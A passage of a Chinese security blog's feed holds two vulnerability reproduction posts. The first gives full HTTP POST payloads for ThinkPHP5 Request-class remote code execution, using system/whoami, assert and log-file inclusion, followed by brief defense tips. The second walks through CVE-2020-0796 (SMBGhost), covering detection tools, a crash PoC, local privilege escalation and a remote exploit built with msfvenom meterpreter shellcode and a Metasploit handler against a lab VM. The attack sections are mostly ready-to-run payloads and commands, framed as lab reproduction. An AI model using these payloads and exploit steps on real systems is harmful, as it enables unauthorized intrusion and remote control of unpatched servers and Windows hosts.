class="line">s=whoami&amp;_method=__construct&amp;filter[]=system</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png" alt="1"></p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png" alt="2"></p><h2 id="版本-5-0-12-5-0-23"><a href="#版本-5-0-12-5-0-23" class="headerlink" title="版本 5.0.12-5.0.23"></a>版本 5.0.12-5.0.23</h2><p>在5.0.12之后的版本中，在<code>thinkphp/library/think/App.php的module</code>方法中增加了设置filter过滤属性的代码</p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png" alt="3"></p><p>开启debug调试模式，打开配置文件<code>config.php</code></p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png" alt="4"></p><p>修改为</p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="5"></p><blockquote><p>Payload 1</p></blockquote>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：   </p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png" alt="6"><br>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png" alt="7"></p><blockquote><p>Payload 2</p></blockquote>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../runtime/log/202007/08.log&amp;x=phpinfo();</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：   </p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png" alt="8"><br>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png" alt="9"></p><blockquote><p>Payload 3</p></blockquote>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=assert&amp;server[]=phpinfo&amp;get[]=phpinfo()</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：   </p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" alt="10"></p><blockquote><p>Payload 4</p></blockquote>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=phpinfo</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：   </p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" alt="11"></p><h2 id="版本-5-1-10（PHP7-3-4-Apache2-4-39）"><a href="#版本-5-1-10（PHP7-3-4-Apache2-4-39）" class="headerlink" title="版本 5.1.10（PHP7.3.4+Apache2.4.39）"></a>版本 5.1.10（PHP7.3.4+Apache2.4.39）</h2><p>5.1和5.2两个版本现在用的很少，并且针对于这两个版本有点鸡肋，需要index.php文件中跳过报错提示。 语句：error_reporting(0);</p><p>需设置 <code>error_reporting(0);</code></p><blockquote><p> Payload：</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 76</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: thinkphp_show_page_trace=0|0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">c=system&amp;f=whoami&amp;_method=filter</span><br></pre></td></tr></table></figure><p>一开始执行结果如下图：</p><p><img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" alt="12"></p><p>找到RuleGroup.php 新增一行代码error_reporting(0);跳过报错</p><p><img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png" alt="13"></p><p>然后查看结果</p><p><img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png" alt="14"></p><h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ol><li><p>线上环境建议关闭debug模式</p></li><li><p>升级到ThinkPHP 5.0.24</p></li><li><p>手动增加过滤，在<code>thinkphp/library/think/Request.php</code>添加如下代码：</p><p><img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" alt="12"></p></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://seaii-blog.com/index.php/2019/01/14/88.html" target="_blank" rel="noopener">ThinkPHP5 远程代码执行漏洞分析</a></p><p><a href="https://xz.aliyun.com/t/3845#toc-0" target="_blank" rel="noopener">ThinkPHP 5.0.0~5.0.23 RCE 漏洞分析</a></p><p><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">ThinkPHP5 核心类 Request 远程代码漏洞分析</a></p><p><a href="https://blog.csdn.net/csacs/article/details/86668057" target="_blank" rel="noopener">ThinkPHP 5.0.x、5.1.x、5.2.x 全版本远程命令执行漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;ThinkPHP5-核心类-Request-远程代码漏洞复现-Poc&quot;&gt;&lt;a href=&quot;#ThinkPHP5-核心类-Request-远程代码漏洞复现-Poc&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5 核心类 Request 远程代码漏洞复现+Poc&quot;&gt;&lt;/a&gt;ThinkPHP5 核心类 Request 远程代码漏洞复现+Poc&lt;/h1&gt;&lt;h1 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h1&gt;&lt;p&gt;2019年1月11日，ThinkPHP团队发布了一个&lt;a href=&quot;https://blog.thinkphp.cn/910675&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;补丁更新&lt;/a&gt;，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。&lt;/p&gt;
&lt;p&gt;ThinkPHP官方发布新版本5.0.24，在1月14日和15日又接连发布两个更新，这三次更新都修复了一个安全问题，该问题可能导致远程代码执行 ，这是ThinkPHP近期的第二个高危漏洞，两个漏洞均是无需登录即可远程触发，危害极大。&lt;/p&gt;
&lt;p&gt;之前写过一篇文章《&lt;a href=&quot;https://chaceshadow.github.io/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/#method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ThinkPHP-5-代码执行漏洞复现-POC&lt;/a&gt;》里面有提过一次，这篇文章主要对其不同版本下进行详细的复现。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="ThinkPHP 5" scheme="http://yoursite.com/tags/ThinkPHP-5/"/>
    
      <category term="ThinkPHP" scheme="http://yoursite.com/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796 SMBv3 RCE漏洞检测+复现</title>
    <link href="http://yoursite.com/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-06-09T12:11:00.000Z</published>
    <updated>2020-06-09T13:45:56.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><blockquote><p>2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，恶意伪造的压缩数据包 时出现的错误引发的，从而造成SMB服务器的缓冲区溢出,攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。</p></blockquote><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p></blockquote><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p>漏洞存在于在srv2.sys驱动中，由于SMB没有正确处理压缩的数据包，在解压数据包的时候调用函数Srv2DecompressData处理压缩数据时候，对压缩数据头部压缩数据大小OriginalCompressedSegmentSize和其偏移Offset的没有检查其是否合法，导致其相加可分配较小的内存，后面调用SmbCompressionDecompress进行数据处理时候使用这片较小的内存可导致拷贝溢出或越界访问，而在执行本地程序的时候，可通过获取当前本地程序的token+0x40的偏移地址，通过发送压缩数据给SMB服务器，之后此偏移地址在解压缩数据时候拷贝的内核内存中，通过精心构造的内存布局在内核中修改token将权限提升。</p></blockquote><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>漏洞不影响 win7，漏洞影响 Windows 10 1903 之后的各个 32 位、64 位版 Windows，包括家用版、专业版、企业版、教育版。</p><blockquote><p>Windows 10 Version 1903 for 32-bit<br>Windows 10 Version 1903 for x64<br>Windows 10 Version 1903 for arm64<br>Windows 10 Version 1909 for 32-bit<br>Windows 10 Version 1909 for x64<br>Windows 10 Version 1909 for arm64<br>Windows Server 10 Version 1903 for server core installation<br>Windows Server 10 Version 1909 for server core installation</p></blockquote><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><dl><dt>攻击机：Kali Linux</dt><dd>IP：192.168.219.135<br>可以 ping 通 win10 虚拟机</dd></dl><dl><dt>靶 机：Windows 10 虚拟机 1909 x64 (专业版）</dt><dd>IP：192.168.219.142<br>关闭防火墙和 defender<br>1903 或者 1909 版本均可，我这里用的是1909版本</dd></dl><p>宿主机：Windows 7</p><h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><p>首先确认系统版本符合要求<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/1.png" alt><br>使用systeminfo确定下主机有没有打过这个补丁KB4551762<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/2.png" alt><br>关闭防火墙和 defender<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/3.png" alt></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="git脚本检测"><a href="#git脚本检测" class="headerlink" title="git脚本检测"></a>git脚本检测</h3><blockquote><p><a href="https://github.com/ollypwn/SMBGhost" target="_blank" rel="noopener">https://github.com/ollypwn/SMBGhost</a></p></blockquote><p>检测返回的数据包中SMB压缩版本，这种检测方式打过补丁依然会误报。<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/4.png" alt><br><em>PS:脚本适用python3，宿主机电脑中只有python2，稍微修改一下print即可</em></p><h3 id="奇信安检测工具"><a href="#奇信安检测工具" class="headerlink" title="奇信安检测工具"></a>奇信安检测工具</h3><blockquote><p><a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip" target="_blank" rel="noopener">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p></blockquote><p>适用于局域网批量检测，快速查找未打补丁的机器。<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/5.png" alt></p><h3 id="腾讯电脑管家SMB漏洞修复工具"><a href="#腾讯电脑管家SMB漏洞修复工具" class="headerlink" title="腾讯电脑管家SMB漏洞修复工具"></a>腾讯电脑管家SMB漏洞修复工具</h3><blockquote><p><a href="http://dlied6.qq.com/invc/QQPatch/QuickFix_SMB0796.exe" target="_blank" rel="noopener">http://dlied6.qq.com/invc/QQPatch/QuickFix_SMB0796.exe</a></p></blockquote><p>适用于个人用户检测，一键快速检测和修复。<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/6.png" alt></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="蓝屏演示"><a href="#蓝屏演示" class="headerlink" title="蓝屏演示"></a>蓝屏演示</h3><p>蓝屏攻击POC:</p><blockquote><p><a href="https://github.com/eerykitty/CVE-2020-0796-PoC" target="_blank" rel="noopener">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;eerykitty&#x2F;CVE-2020-0796-PoC.git</span><br><span class="line">python3 setup.py install</span><br><span class="line">python3 CVE-2020-0796.py 192.168.219.142</span><br></pre></td></tr></table></figure><p>安装脚本和依赖库<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/7.png" alt><br>依赖库安装成功后执行蓝屏攻击脚本<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/8.png" alt><br>攻击成功结果如下<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/9.png" alt></p><h3 id="提权演示"><a href="#提权演示" class="headerlink" title="提权演示"></a>提权演示</h3><p>本地提权POC:</p><blockquote><p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a></p></blockquote><p>文件编译结果执行文件有两个，一个动态的，一个静态的，动态的需要另外安装相关dll文件，我们直接执行静态提权程序，成功弹出更高的system权限命令执行窗口</p><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/10.png" alt></p><h3 id="RCE演示"><a href="#RCE演示" class="headerlink" title="RCE演示"></a>RCE演示</h3><p>远程利用POC:</p><blockquote><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p></blockquote><ul><li>Kali下载POC</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;cve# git clone https:&#x2F;&#x2F;github.com&#x2F;chompie1337&#x2F;SMBGhost_RCE_PoC</span><br><span class="line">root@kali:~&#x2F;cve# cd SMBGhost_RCE_PoC</span><br><span class="line">root@kali:~&#x2F;cve&#x2F;SMBGhost_RCE_PoC# ls</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/11.png" alt><br><em>PS：该POC需要用python3环境执行</em></p><ul><li>使用msfvenom生成payload，生成TXT文件便于后面修改</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;cve&#x2F;SMBGhost_RCE_PoC# msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;1234 -f py -o 1.txt</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/12.png" alt></p><ul><li>将1.txt 生成的code中参数buf改为USER_PAYLOAD，然后替换到exploit.py中的USER_PAYLOAD参数。（顺序不要颠倒，否则执行会失败的，因为你在py全文替换buf的话，不小心会把代码中的全部的buf替换的）</li></ul><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/13.png" alt><br>这里不要忘记字符串前面的二进制格式换<code>b&quot;&quot;</code>不然脚本执行错误<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/14.png" alt></p><ul><li>新建一个终端，启动msf监听本地端口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 1234</span><br><span class="line">lport &#x3D;&gt; 1234</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set rhost 192.168.219.142</span><br><span class="line">rhost &#x3D;&gt; 192.168.219.142</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/15.png" alt></p><ul><li>运行exploit.py</li></ul><p><code>python3 exploit.py -ip 192.168.219.142</code><br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/16.png" alt></p><p>一开始没反应，试了好几次，最后成功反弹shell（大家尝试的时候多试几次，看网上其他大佬说很容易蓝屏，蓝屏没有遇到，只是前几次每次执行后没反应，然后发现win10卡死了，ping不通，重启靶机即可）<br><img src="/2020/06/09/CVE-2020-0796-SMBv3-RCE%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%A4%8D%E7%8E%B0/17.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/xiaozi/p/13062533.html" target="_blank" rel="noopener">CVE-2020-0796 检测及利用工具</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，恶意伪造的压缩数据包 时出现的错误引发的，从而造成SMB服务器的缓冲区溢出,攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="CVE-2020-0796" scheme="http://yoursite.com/tags/CVE-2020-0796/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="SMB" scheme="http://yoursite.com/tags/SMB/"/>
    
      <category term="POC" scheme="http://yoursite.com/tags/POC/"/>
    
      <category term="漏洞检测" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP 5 代码执行漏洞复现+POC</title>
